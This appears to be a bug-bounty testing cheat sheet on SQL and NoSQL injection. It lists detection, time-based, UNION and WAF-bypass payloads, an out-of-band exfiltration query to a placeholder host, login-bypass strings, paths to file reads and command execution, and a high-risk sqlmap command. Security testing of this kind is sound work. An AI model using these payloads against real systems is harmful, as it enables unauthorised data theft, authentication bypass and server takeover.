# SQL / NoSQL Injection (deep)

User input reaches a database query. Consistently pays High–Critical (data exfil, auth bypass, RCE).
Never trust an automated tool before a manual fingerprint.

## Where it lives
Any param reaching a query: `search`, `filter`, `sort`, `order`, `id`, `q`, `where`, `limit`, `offset`,
`category`, `date`; JSON body fields; GraphQL string args ([graphql.md](graphql.md)); ORM `order_by`/
`sort` (column injection); and **logged headers** (`X-Forwarded-For`, `User-Agent`, `Referer`) that hit a
query → **second-order** SQLi. Also multipart filenames and cookie values.

## Detection ladder (manual first)
```sql
'          "          `          \        -- provoke an error / 500 / different response
' OR '1'='1     ' OR 1=1-- -     ' OR 1=1#         -- boolean true
' AND '1'='2                                        -- boolean false (compare responses)
```
```sql
-- time-based blind (per DBMS) — the universal confirmer
' AND SLEEP(5)-- -                 MySQL/MariaDB
' AND pg_sleep(5)-- -              PostgreSQL
'; WAITFOR DELAY '0:0:5'-- -       MSSQL
' AND 1=dbms_pipe.receive_message('a',5)-- -   Oracle
```
```sql
-- UNION (find column count, then reflect)
' ORDER BY 5-- -                   -- increment until error → column count
' UNION SELECT NULL,NULL,NULL-- -  -- match count, swap NULLs for @@version / user()
' UNION SELECT NULL,@@version,NULL-- -
```
**Types:** in-band (error/UNION), blind (boolean/time), **second-order** (stored then triggered elsewhere),
out-of-band (DNS/HTTP exfil when blind + no output).

## WAF / filter bypass
```
/*!50000SELECT*/   SE/**/LECT   SeLeCt          -- inline comment / case
'%20OR%201=1       '+OR+1=1     '/**/OR/**/1=1  -- whitespace alternatives (%09 %0a %0c %0d /**/ +)
%27  %2527        (double-encode)   0x61646d696e (hex literal)   char(97,100,109,105,110)
' OR 1=1 LIMIT 1 -- -             -- trim to one row
OOB exfil (MySQL): ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.OOB\\a'))-- -
```

## Escalate (prove impact)
- **Data exfil:** dump a real, sensitive table (users/emails/hashes) — show actual rows + DB version.
- **Auth bypass:** `admin'-- -` / `' OR 1=1 LIMIT 1-- -` into a login → session as admin.
- **File read:** MySQL `LOAD_FILE('/etc/passwd')`; MSSQL `OPENROWSET`.
- **→ RCE** (see [rce.md](rce.md)): MySQL `INTO OUTFILE`/UDF, MSSQL `xp_cmdshell`, PostgreSQL
  `COPY … TO PROGRAM` / `CREATE FUNCTION`, stacked queries where the driver allows.

## NoSQL injection (Mongo et al.)
```
Auth bypass (JSON body): {"username":{"$gt":""},"password":{"$gt":""}}
Extraction:              {"email":{"$regex":"^a"}}   (boolean/blind char-by-char)
Operator via query:      user[$ne]=x&pass[$ne]=x     (URL-encoded operators)
JS eval:                 {"$where":"sleep(3000)"}    (time-based confirm)
```

## Tools (after manual fingerprint)
`sqlmap -u '…' --batch --risk=3 --level=5 --dbms=<db> --tamper=space2comment,between` — feed it the
confirmed DBMS + param. `ghauri` for cleaner blind. For GraphQL: extract the arg into a request template.

## Proof-of-impact bar
Real rows / DB version / auth bypass — **not** a bare error string (that's the N/A signal in
[validation.md](validation.md)). SQLi with data exfil = 8.6 High; unauth SQLi/→RCE = 9.8 Critical.
